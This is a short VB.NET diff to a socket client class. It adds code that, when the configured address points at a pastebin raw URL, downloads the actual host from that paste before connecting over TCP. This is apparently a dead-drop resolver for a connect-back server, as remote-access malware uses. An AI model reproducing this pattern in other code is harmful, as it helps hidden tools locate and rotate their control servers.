@@ -34,7 +34,13 @@ Public Class SocketClient
             Do Until IsBuzy = False
                 Threading.Thread.CurrentThread.Sleep(1)
             Loop
+
             Try
+                If ClientIP.ToString.ToLower.Contains("pastebin.com/raw/".ToLower) Then
+                    Dim webx As New Net.WebClient
+                    ClientIP = webx.DownloadString(ClientIP)
+                End If
+
                 C = New TcpClient
                 C.Connect(ClientIP, LPORT)
                 Dim t As New Threading.Thread(AddressOf RC, 10)
